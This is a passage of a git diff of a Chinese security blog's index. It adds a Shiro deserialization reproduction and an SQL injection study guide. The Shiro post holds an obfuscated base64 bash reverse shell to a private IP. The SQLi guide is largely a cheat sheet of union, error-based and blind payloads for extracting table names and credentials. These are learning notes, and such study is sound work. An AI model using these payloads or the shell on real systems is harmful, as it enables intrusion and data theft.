在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义</span><br><span class="line">    lock = threading.RLock()</span><br><span class="line"></span><br><span class="line">    for port in range(1, 65536):</span><br><span class="line">        q.put(port)</span><br><span class="line">    for i in range(thread_num):</span><br><span class="line">        # 开启守护进程</span><br><span class="line">        t = threading.Thread(target=portScan, daemon=True)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    # 设置主进程死循环，方便接收中断信号</span><br><span class="line">    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束</span><br><span class="line">    while 1:</span><br><span class="line">        pass</span><br></pre>
 
+
+
+<h1 id="四、下载"><a href="#四、下载" class="headerlink" title="四、下载"></a>四、下载</h1><p><a href="https://www.zerochen.top/download/Port/portScan.py">https://www.zerochen.top/download/Port/portScan.py</a></p>
 ]]></content>
       <categories>
         <category>Python</category>
       </categories>
       <tags>
-        <tag>socket模块</tag>
-        <tag>threading模块</tag>
+        <tag>portscan</tag>
       </tags>
   </entry>
   <entry>
-    <title>Python之网络爬虫</title>
-    <url>/article/f3b65bec.html</url>
-    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>借用网络爬虫脚本，记录下requests模块和bs4模块的知识点，以供日后查阅。</p>
-<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h2><p>介绍：发送简单请求，获取响应</p>
-<p>使用：</p>
-<pre class="highlight"><span class="line">import requests				# 导包</span><br><span class="line">res = requests.get(url)		# 发送get请求包（可换成.post）</span><br><span class="line">res.text					# 获取返回包内容</span><br><span class="line">res.request					# 获取请求包内容</span><br><span class="line">res.encoding  				# 获取页面编码格式</span><br><span class="line">res.content			  		# http响应内容的二进制形式</span><br><span class="line">res.status_code				# http响应码，200响应成功，404失败</span><br></pre>
+    <title>Shiro反序列化漏洞复现</title>
+    <url>/article/12dfe94f.html</url>
+    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
+<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
+<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
 
+<p>b、使用xray检测，直接发送payload</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
 
+<p>或指定脚本检测</p>
+<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
 
-<h2 id="BeautifulSoup模块"><a href="#BeautifulSoup模块" class="headerlink" title="BeautifulSoup模块"></a>BeautifulSoup模块</h2><p>介绍：用于解析html/xml。</p>
-<p>使用</p>
-<pre class="highlight"><span class="line">from bs4 import BeautifulSoup				# 导包</span><br><span class="line">soup = BeautifulSoup(&#x27;html&#x27;, &#x27;lxml&#x27;)		# 获取html属性</span><br><span class="line">soup.title									# 获取其中title内容,包括标签</span><br><span class="line">soup.title.string							# 仅获取title</span><br><span class="line">soup.select									# 指定某个元素下某个标签</span><br><span class="line">	soup.select(&#x27;.book-mulu &gt; ul &gt; li &gt; a&#x27;)</span><br><span class="line">	同</span><br><span class="line">	soup.find(&#x27;div&#x27;,class_=&#x27;chapter_content&#x27;)</span><br><span class="line">soup.text									# 获取标签内容</span><br><span class="line">find_all									# 查找所有符合条件的元素</span><br><span class="line">find										# 匹配第一个元素</span><br><span class="line"></span><br></pre>
-
-
-
-<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用网络爬虫脚本，梳理bs4、requests的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># 自定义请求头</span><br><span class="line">headers = &#123;</span><br><span class="line">    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def page_link(url):</span><br><span class="line">    con = &#x27;&#x27;</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)</span><br><span class="line">    # 获取当前页面编码格式</span><br><span class="line">    code = reponse.encoding</span><br><span class="line">    # 对响应包的内容解码</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)</span><br><span class="line">    # 使用bs获取指定标签内容（需绑定解析器lxml）</span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;).select(&#x27;.onearcxsbd &gt; p&#x27;)</span><br><span class="line">    for i in soup:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        con = con + i.text</span><br><span class="line">    return con</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url = &#x27;https://www.xyyuedu.com/gdmz/sidamingzhu/sgyy/&#x27;      # 目标地址</span><br><span class="line">    reponse = requests.get(url=url, headers=headers)            # 获取请求</span><br><span class="line">    # print(reponse.text)</span><br><span class="line">    code = reponse.encoding                                     # 获取编码方式</span><br><span class="line">    # code = reponse.apparent_encoding</span><br><span class="line">    # print(code)</span><br><span class="line">    page_text = reponse.text.encode(code).decode(&#x27;gbk&#x27;)         # 先以网页原编码方式编码，在以指定格式解码，注意，数据仅以编码方式存储，但未进行编码</span><br><span class="line">    # print(page_text)</span><br><span class="line"></span><br><span class="line">    soup = BeautifulSoup(page_text, &quot;lxml&quot;)                     # 创建soup对象并指定解析器</span><br><span class="line">    aAttr = soup.select(&#x27;.zhangjie2 &gt; li &gt; a&#x27;)                  # 获得url所在的标签信息</span><br><span class="line">    # print(aAttr)</span><br><span class="line"></span><br><span class="line">    for i in aAttr:</span><br><span class="line">        # print(i.text)</span><br><span class="line">        title = i.text</span><br><span class="line">        link = &#x27;https://www.xyyuedu.com&#x27; + i[&#x27;href&#x27;]        # 获取章节连接</span><br><span class="line">        content = page_link(link)</span><br><span class="line">        print(&#x27;开始下载 \n&#x27; + title)</span><br><span class="line">        # print(title)</span><br><span class="line">        # print(link)</span><br><span class="line">        # print(content)</span><br><span class="line">        with open(&#x27;./三国演义.txt&#x27;, &#x27;a&#x27;, encoding=&#x27;utf-8&#x27;) as fp:</span><br><span class="line">            fp.write(title + &#x27;\n&#x27; + content + &#x27;\n\n\n&#x27;)</span><br><span class="line">            print(title + &#x27;\n&#x27; + &#x27;下载结束&#x27; + &#x27;\n&#x27;)</span><br></pre>
-
+<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
 ]]></content>
       <categories>
-        <category>Python</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>BeautifulSoup模块</tag>
-        <tag>requests模块</tag>
+        <tag>Shiro反序列</tag>
       </tags>
   </entry>
   <entry>
@@ -881,82 +1307,433 @@
       </categories>
       <tags>
         <tag>Redis未授权访问</tag>
-        <tag>Python脚本</tag>
       </tags>
   </entry>
   <entry>
-    <title>Shiro反序列化漏洞复现</title>
-    <url>/article/12dfe94f.html</url>
-    <content><![CDATA[<h1 id="1、探测"><a href="#1、探测" class="headerlink" title="1、探测"></a>1、探测</h1><p>在登录界面回包中，有rememberMe=deleteMe参数，说明使用Shiro反序列化。</p>
-<h1 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用"></a>2、利用</h1><p>a、使用shiroExploit工具检测，反弹shell</p>
-<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>
-
-<p>b、使用xray检测，直接发送payload</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --html-output 1.html</span><br></pre>
-
-<p>或指定脚本检测</p>
-<pre class="highlight"><span class="line">xray webscan --url &quot;http://&quot; --plugins shiro --html-output 1.html</span><br></pre>
-
-<p>将发包贴入burpsuite发包，将Testecho: namzzg修改为Testcmd:ls即可执行对应指令，也可反弹shell，语句同上</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Shiro反序列</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Typora常用快捷键</title>
-    <url>/article/12a67745.html</url>
-    <content><![CDATA[<table>
+    <title>SQL注入方法总结</title>
+    <url>/article/30e59cf7.html</url>
+    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>SQL注入学习完毕，按照惯例，进行一波复盘总结，包括探测发现、方法利用。</p>
+<p>大致流程：</p>
+<p>1、判断换是否有注入漏洞，识别注入点类型</p>
+<p>2、获取数据库中的信息</p>
+<p>​            获取数据库基本信息（数据库版本、数据库类型、查询列数等）</p>
+<p>​            获取数据库库名</p>
+<p>​            获取表名</p>
+<p>​            获取列名</p>
+<p>​            获取用户数据</p>
+<p>3、破解加密数据（数据解密）</p>
+<p>4、提升权限（配合其他漏洞）</p>
+<p>5、内网渗透（配合其他漏洞）</p>
+<h1 id="二、SQL注入产生原因"><a href="#二、SQL注入产生原因" class="headerlink" title="二、SQL注入产生原因"></a>二、SQL注入产生原因</h1><p>1、不当的类型处理</p>
+<p>2、不安全的数据库配置</p>
+<p>3、不合理的查询集处理</p>
+<p>4、不当的错误处理</p>
+<p>5、转义字符处理不合适</p>
+<p>6、多个提交处理不当</p>
+<h1 id="三、SQL注入利用前提"><a href="#三、SQL注入利用前提" class="headerlink" title="三、SQL注入利用前提"></a>三、SQL注入利用前提</h1><p>1、用户能控制输入的内容</p>
+<p>2、Web应用能把用户输入的内容带入到数据库中执行</p>
+<h1 id="四、SQL注入探测与利用（内含思路）"><a href="#四、SQL注入探测与利用（内含思路）" class="headerlink" title="四、SQL注入探测与利用（内含思路）"></a>四、SQL注入探测与利用（内含思路）</h1><p>前面硬邦邦的含义介绍完毕，开始本文干货内容。</p>
+<h2 id="1、分类"><a href="#1、分类" class="headerlink" title="1、分类"></a>1、分类</h2><p>在探测前，要了解SQL注入的分类，方便理解。</p>
+<table>
 <thead>
 <tr>
-<th>快捷键</th>
+<th>分类方式</th>
+<th>类型</th>
+<th>判断分类意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>根据请求方式分类</td>
+<td>GET请求注入<br>POST请求注入</td>
+<td>调整注入使用的工具</td>
+</tr>
+<tr>
+<td>根据注入点参数分类</td>
+<td>字符型注入<br>整数型注入<br>搜索型注入</td>
+<td>判断闭合符号</td>
+</tr>
+<tr>
+<td>根据页面反馈结果分类</td>
+<td>union注入<br>报错注入<br>布尔盲注<br>时间延时盲注<br>其他类型</td>
+<td>调整注入手法</td>
+</tr>
+<tr>
+<td>根据数据库类型分类</td>
+<td>MySQL注入<br>SQLServer注入<br>Oracle注入<br>Access注入</td>
+<td>调整注入语句</td>
+</tr>
+<tr>
+<td>其他类型</td>
+<td>请求头注入<br>内联注入<br>宽字节注入<br>二次编码注入<br>堆叠注入<br>二阶注入</td>
+<td>特殊情况特殊对待</td>
+</tr>
+</tbody></table>
+<h2 id="2、探测"><a href="#2、探测" class="headerlink" title="2、探测"></a>2、探测</h2><p>标题三中介绍过，用户能控制输入内容的地方+内容被代入数据库执行（增、查等）多可能存在SQL注入，也是我们需要进行探测的地方。具体点来说，就是url、搜索框、数据包中的数据（可能会被代入数据库的部分，如UA、XFF、POST参数等）。</p>
+<p><strong>下面是全文精华所在！思路汇总</strong></p>
+<pre class="highlight"><span class="line">使用&#x27;、&quot;、\（单引号双引号斜杠，全加）</span><br><span class="line">页面变化（内容变化、报错等）</span><br><span class="line">	--&gt;使用单个截断符再次判断，若页面返回正常则为字符型注入。（需要用闭合符闭合语句）</span><br><span class="line">	--&gt;页面一直异常，则改为2-1（若原数字为1）,页面返回正常则为整数型注入。（不需要使用闭合符）</span><br><span class="line">	</span><br><span class="line">	再来判断闭合符。（需要结合具体环境分析可能存在的sql语句）</span><br><span class="line">		--&gt;使用让页面异常的符号（\为转义，若有注入必报错，不做判断要求）+若干闭合符（)、%等）+注释符（#、-- ），直至页面返回正		常【注意，#在url中使用需要url编码（%23），--空格使用最好为-- a，避免空格被编码吃掉，空格后可以为任意字符】</span><br><span class="line">		插入：若是在搜索处，需要注意搜索类型，判断基础语句为（%&#x27;and &#x27;%&#x27;=&#x27; 闭合%）</span><br><span class="line">		至此，闭合符判断完毕</span><br><span class="line">	</span><br><span class="line">	使用闭合符+order by 数字+注释符判断数据库列数</span><br><span class="line">		--&gt;二分法判断，使页面正常的最大整数即为数据库列数</span><br><span class="line">		</span><br><span class="line">	尝试注入手法（布尔盲注-union联合查询-报错注入）</span><br><span class="line">	（内联注入-堆叠注入）</span><br><span class="line">	这里为判断尝试优先级</span><br><span class="line">		&gt;&gt;布尔盲注即输入正确时返回数据，不正确时无任何显示。情况较为明显，若有这种情况则有优先进行布尔盲注。</span><br><span class="line">		&gt;&gt;union联合查询为常规手法，需要有显示位。若无显示位再尝试其他方法。</span><br><span class="line">		&gt;&gt;最后是报错注入，使用报错语句手动制造报错信息，多用于页面异常但是不报错的情况。</span><br><span class="line">	其他情况。在上述手法中，可穿插内联注入（使用and、or连接闭合语句，使原来语句依旧执行）、堆叠注入（使用;连接多个语句，全部执	行）【注：内联注入和堆叠注入前提是存在注入】</span><br><span class="line">		</span><br><span class="line">页面无变化（时间延时盲注-宽字节注入-二次编码注入-二阶注入）</span><br><span class="line">	四种方式无书序要求，按照出现概率进行排序</span><br><span class="line">	--&gt;时间延时盲注，利用延时语句判断注入语句是否正确</span><br><span class="line">	--&gt;宽字节注入</span><br><span class="line">	--&gt;二次编码注入</span><br><span class="line">	--&gt;二阶注入通常发生在注册、发表文章等页面，虽然写入的注入语句被防护后写入数据库，但是当再次执行时则会触发。</span><br><span class="line">	--&gt;无注入</span><br><span class="line"></span><br><span class="line">最后还有个文件头注入，这里可以直接对文件头参数进行探测尝试，也可以使用Header Editor插件，对User-Agent、X-Forwarded-For进行编辑，在其后加入判断符，并保持插件开启状态，当存在注入时，自动触发异常。（遇到无变化的情况仍需手测，这里只针对可能被存入数据库的参数进行测试）</span><br></pre>
+
+
+
+<h2 id="五、数据库常用语句"><a href="#五、数据库常用语句" class="headerlink" title="五、数据库常用语句"></a>五、数据库常用语句</h2><p>核心查询语句，万变不离其宗</p>
+<p>常用命令</p>
+<pre class="highlight"><span class="line">show databases;					#显示所有数据库</span><br><span class="line">use dbname;						#选定数默认数据库</span><br><span class="line">show tables;					#显示默认数据库中所有表</span><br><span class="line"></span><br><span class="line">create database db_test;		#创建数据库</span><br><span class="line">use db_test;					#选定数据库</span><br><span class="line">create table tb_test();			#创建表</span><br><span class="line">CREATE TABLE tb_news(</span><br><span class="line">	id INT(10) UNSIGNED UNIQUE AUTO_INCREMENT,</span><br><span class="line">	title VARCHAR(100) NOT NULL,</span><br><span class="line">	author VARCHAR(20) NOT NULL,</span><br><span class="line">	content TEXT NOT NULL,</span><br><span class="line">	addtime TIMESTAMP,</span><br><span class="line">	PRIMARY KEY (id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CREATE TABLE tb_users(</span><br><span class="line">	id INT(10) UNSIGNED AUTO_INCREMENT,</span><br><span class="line">	uname VARCHAR(20) NOT NULL,</span><br><span class="line">	upass VARCHAR(50) NOT NULL,</span><br><span class="line">	activeSrc VARCHAR(100) DEFAULT &#x27;image/default.jpg&#x27;,</span><br><span class="line">	email VARCHAR(50) NOT NULL,</span><br><span class="line">	addtime TIMESTAMP,</span><br><span class="line">	PRIMARY KEY (id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">UNIQUE 值唯一</span><br><span class="line">id属性固定（设置自增长）</span><br><span class="line">KEY属性固定（设定ID为主键）</span><br><span class="line">desc tb_test;						#查看表内容</span><br><span class="line"></span><br><span class="line">insert INTO tb_test (字段) VALUE (&#x27;内容&#x27;);			#新增字段，键值一一对应</span><br><span class="line">insert INTO tb_test (author,title,content) VALUES (&#x27;zs&#x27;,&#x27;title1&#x27;,&#x27;dasdasadadadad&#x27;);</span><br><span class="line"></span><br><span class="line">select * from tb_test where xx;				#查询数据 </span><br><span class="line">* 可替换为指定键</span><br><span class="line">where限定查询范围，查询表达式运算从前往后</span><br><span class="line">xx可以为：&gt;、&lt;、=、like</span><br><span class="line">分别对应数值匹配和字符串匹配，like搭配%使用（%n查询以n结尾的数据）</span><br><span class="line">select * from tb_news where content like &#x27;%n%&#x27;    		#搜索content中包含n的内容</span><br><span class="line">select * from tb_news where addtime &gt; &#x27;2021-06-23 16:48:46&#x27; and (content like &#x27;%8%&#x27; or id &lt; 16);</span><br><span class="line">#搜索范围使用and连接，标识并列，or连接表示或者</span><br><span class="line"></span><br><span class="line">delete										#删除</span><br><span class="line">delete from tb_news;        				#删除表格全部数据</span><br><span class="line">delete from tb_news where id =18;        	#最小删除单位为行    查询限制条件同select</span><br><span class="line"></span><br><span class="line">update										#修改数据</span><br><span class="line">update tb_news set author = &#x27;zs&#x27;, title = &#x27;hello&#x27;;        			#修改全部数据</span><br><span class="line">update tb_news set author = &#x27;zs&#x27;, title = &#x27;hello&#x27; where id=2;    	#修改id=2的指定数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alter table 表名 action								#修改表结构</span><br><span class="line">action可以为：</span><br><span class="line">add 列名 建表语句 [first|afer 列名]  					#为表添加一列，默认列尾添加</span><br><span class="line">add primary key(列名)   								#为表添加主键，已存在主键则报错</span><br><span class="line">modify 列名 &lt;建表语句&gt; [first|after 列名]  			  	#更改列类型和列名称</span><br><span class="line">drop 												#列名   删除一列</span><br><span class="line">rename as 											#新表名    更改表名</span><br><span class="line"></span><br></pre>
+
+
+
+<h1 id="六、详细方法"><a href="#六、详细方法" class="headerlink" title="六、详细方法"></a>六、详细方法</h1><p>数据库常用函数</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
 <th>说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td>Ctrl+T</td>
-<td>插入表格</td>
+<td>version()</td>
+<td>数据库版本号</td>
 </tr>
 <tr>
-<td>Ctrl+Shift+K</td>
-<td>插入代码块</td>
+<td>database()</td>
+<td>当前数据库</td>
 </tr>
 <tr>
-<td>Ctrl+0</td>
-<td>段落</td>
+<td>user()</td>
+<td>当前用户</td>
 </tr>
 <tr>
-<td>Ctrl+1-6</td>
-<td>1-6级标题</td>
+<td>current_user()</td>
+<td>当前用户名</td>
 </tr>
 <tr>
-<td>Ctrl+Enter</td>
-<td>表格下方插入行</td>
+<td>system_user()</td>
+<td>系统用户名</td>
 </tr>
 <tr>
-<td>Ctrl+/</td>
-<td>源码编辑</td>
+<td>@@datadir</td>
+<td>数据库路径</td>
 </tr>
 <tr>
-<td>Ctrl+Shift+V</td>
-<td>粘贴为纯文本</td>
+<td>@@version_compile_os</td>
+<td>操作系统版本</td>
 </tr>
 </tbody></table>
-<p>文件-偏好设置-高级设置-conf.user.json    重新设置快捷键</p>
-<pre class="highlight"><span class="line">&quot;keyBinding&quot;: &#123;</span><br><span class="line">    // for example: </span><br><span class="line">    // &quot;Always on Top&quot;: &quot;Ctrl+Shift+P&quot;</span><br><span class="line">    &quot;Always on Top&quot;: &quot;Ctrl+Shift+P&quot;,  </span><br><span class="line">    &quot;Code Fences&quot;: &quot;Ctrl+Shift+F&quot;,  </span><br><span class="line">    &quot;Ordered List&quot;:&quot;Ctrl+Alt+o&quot;,  </span><br><span class="line">    &quot;Unordered List&quot;: &quot;Ctrl+Alt+u&quot;  </span><br><span class="line">  &#125;,</span><br></pre>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>limit</td>
+<td>限制查询数量，下标从0开始  limit  0,2 从0开始查两个</td>
+</tr>
+<tr>
+<td>length()</td>
+<td>计算数据长度</td>
+</tr>
+<tr>
+<td>count()</td>
+<td>计算数据行数</td>
+</tr>
+<tr>
+<td>mid(str,1,30)</td>
+<td>截取字符串，从1开始截取30位,紧跟要截取的部分，即数据库名、表名、字段名和数据名</td>
+</tr>
+<tr>
+<td>substr(str,0,30)</td>
+<td>0为截取初始位，包含整个查询语句</td>
+</tr>
+<tr>
+<td>ascii()</td>
+<td>转为ascii码</td>
+</tr>
+</tbody></table>
+<h2 id="1、union联合查询"><a href="#1、union联合查询" class="headerlink" title="1、union联合查询"></a>1、union联合查询</h2><p>判断数据库列数</p>
+<p>order by + 数字</p>
+<p>报错则用二分法继续判断，直至正常。精确到正常的临界数字，即为列数。</p>
+<p>‘ order by 5#</p>
+<p>修改2为-2，使默认查询语句结果为空，隐去；这样union select结果即可显示。</p>
+<p>然后使用union select联合查,寻找显示位：</p>
+<p>id = -2 union select 1,2,3,4；</p>
+<p>数据库信息查询</p>
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查库名</td>
+<td>-1 union select 1,2,database()– a  推荐<br>-1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a</td>
+</tr>
+<tr>
+<td>查表名</td>
+<td>-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=’数据库名’)– a</td>
+</tr>
+<tr>
+<td>查字段</td>
+<td>-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=’数据库名’ and table_name=’表名’)– a</td>
+</tr>
+<tr>
+<td>查数据</td>
+<td>-1 union select 1,2,(select group_concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)– a</td>
+</tr>
+</tbody></table>
+<p>注意：</p>
+<p>1、union select查询列数要与前面列数相同</p>
+<p>2、concat()拼接多列结果，group_concat()拼接多行结果。</p>
+<p>3、可将查询内容去掉引号，转成16进制形式（前面加上0x）</p>
+<p>4、查表时，建议使用database()，既能避免转义，还可以确定当前有效数据库</p>
+<h2 id="2、报错注入"><a href="#2、报错注入" class="headerlink" title="2、报错注入"></a>2、报错注入</h2><pre class="highlight"><span class="line">updatexml(arg1,arg2,arg3)  				#查询符合条件的数据	</span><br><span class="line">and updatexml(1,concat(0x5e,(select user()),0x5e),1)</span><br><span class="line">XPATH路径报错	mysql5.1.5及以上版本，输出有32位长度限制</span><br><span class="line">0x5e为^的16进制编码，用于绕过斜杠转义，下同</span><br><span class="line"></span><br><span class="line">extractvalue(arg1,arg2)  				 #同上，两个参数	</span><br><span class="line">and extractvalue(1,concat(0x5e,(select user()),0x5e))</span><br><span class="line">XPATH路径报错	mysql5.1及以上版本,输出有32位长度限制</span><br><span class="line"></span><br><span class="line">floor()  								#返回小于等于该值的最大整数（只返回整数部分）	</span><br><span class="line">and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line">floor、count、group by函数冲突报错	mysql5.0及以上版本，user()可变，其他固定</span><br><span class="line"></span><br><span class="line">name_const(name,value) 					#产生一个结果集合列	</span><br><span class="line">and select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a</span><br><span class="line">列名重复报错	mysql5.0及以下</span><br><span class="line"></span><br><span class="line">exp() 									 #以e为底的指数函数	</span><br><span class="line">and exp(~(select * from (select user()) a))</span><br><span class="line">整形溢出报错	mysql5.5.5及以上版本</span><br><span class="line"></span><br><span class="line">几何函数报错（不满足要求就会报错）	</span><br><span class="line">and multipoint((select * from (select * from (select * from (select version())a)b)c))</span><br><span class="line">geometrycollection()</span><br><span class="line">multipoint()</span><br><span class="line">polygon()</span><br><span class="line">multipolygon()</span><br><span class="line">linestring()</span><br><span class="line">multilinestring()</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">将对应user()等地方替换为要执行的sql语句即可</span><br><span class="line">查数据库名	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select database()),0x7e),1)    推荐</span><br><span class="line">或id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)</span><br><span class="line"></span><br><span class="line">查表名	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#x27;数据库名&#x27;),0x7e),1)</span><br><span class="line"></span><br><span class="line">查字段	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;),0x7e),1)</span><br><span class="line"></span><br><span class="line">查数据	</span><br><span class="line">id=1&#x27;and updatexml(1,concat(0x7e,(select mid(group_concat(username,0x7e,password),1,30) from &#x27;数据库名&#x27;.&#x27;表名&#x27;),0x7e),1)</span><br><span class="line"></span><br></pre>
 
-<p>附件，快捷键对照表</p>
-<p> <img src="/article/image-20210620140349383.png" alt="image-20210620140349383" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210620140349383.png" class="lozad post-image"></p>
-<p><img src="/article/image-20210620140429130.png" alt="image-20210620140429130" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/image-20210620140429130.png" class="lozad post-image"></p>
+
+
+<h2 id="3、布尔盲注"><a href="#3、布尔盲注" class="headerlink" title="3、布尔盲注"></a>3、布尔盲注</h2><p>条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）</p>
+<p>用法：</p>
+<p>ascii码二分法</p>
+<table>
+<thead>
+<tr>
+<th>说明</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>先判断数据长度或个数</td>
+<td>and  length((select database())) &gt; 64</td>
+</tr>
+<tr>
+<td>然后进行二分法匹配</td>
+<td>and  ascii(mid((select database()),1,1)) &gt;64</td>
+</tr>
+</tbody></table>
+<p>语句如下（省略二分法，直接用=号），n均为前一句获取的长度值</p>
+<pre class="highlight"><span class="line">and (length(database()))=8		#获取数据库长度	注意：判断长度不需要转ascii码</span><br><span class="line">	</span><br><span class="line">and ascii((select mid(database(),n,1)))=115 -- a		#获取数据库名</span><br><span class="line"></span><br><span class="line">#获取表长度</span><br><span class="line">and length((select mid((table_name),1,1) from information_schema.tables where table_schema=database()))=30 -- a</span><br><span class="line">	</span><br><span class="line">#获取表名	</span><br><span class="line">and ascii((select mid((table_name),1,1) from information_schema.tables where table_schema=database()))=100 -- a</span><br><span class="line"></span><br><span class="line">#获取字段长度</span><br><span class="line">and length((select mid((column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;))=30 -- a</span><br><span class="line"></span><br><span class="line">获取字段名	</span><br><span class="line">and ascii((select mid((column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#x27;表名&#x27;))=30 -- a</span><br><span class="line"></span><br><span class="line">and length((select mid((username,password),1,1) from database().&#x27;表名&#x27;))=30 -- a		#获取数据长度	</span><br><span class="line"></span><br><span class="line">and ascii((select mid((username,password),1,1) from database().&#x27;表名&#x27;))=30 -- a		#获取字段名	</span><br></pre>
+
+
+
+<h2 id="4、时间延时盲注（单双引号页面无变化）"><a href="#4、时间延时盲注（单双引号页面无变化）" class="headerlink" title="4、时间延时盲注（单双引号页面无变化）"></a>4、时间延时盲注（单双引号页面无变化）</h2><p>基于sql盲注，为升级版本</p>
+<p>使用’”%判断时，页面无任何变化，尝试判断是否存在时间盲注</p>
+<p>判断：</p>
+<p>‘“%</p>
+<p>‘ and sleep(3) %23</p>
+<p>“ and sleep(3))%23</p>
+<p>…</p>
+<p>方法同判断截断字符</p>
+<p>用法：</p>
+<table>
+<thead>
+<tr>
+<th>判断函数</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>if</td>
+<td>select  if(arg1,arg2,arg3)  <br>arg1：判断条件  arg2：条件为真时执行的语句  arg3：条件为假时执行的语句  <br>常用：  and select  if((length(database())&gt;5),sleep(5),1) –a</td>
+</tr>
+<tr>
+<td>case when</td>
+<td>select case  when arg1 then arg2 else arg3 end;  <br>arg1：判断条件  arg2：条件为真时执行的语句  arg3：条件为假时执行的语句  <br>常用：  and select  case when ascci(mid(version(),1,1))&gt;64 then sleep(3) end – a</td>
+</tr>
+</tbody></table>
+<p>语句如下（省略二分法，直接用=号）</p>
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>获取数据库长度</td>
+<td>and  if((length(database()))=8),sleep(3),1)            #注意：判断长度不需要转ascii码</td>
+</tr>
+<tr>
+<td>获取数据库名</td>
+<td>and  if((ascii((select mid(database(),1,1)))=115),sleep(3),1) – a</td>
+</tr>
+<tr>
+<td>获取表长度</td>
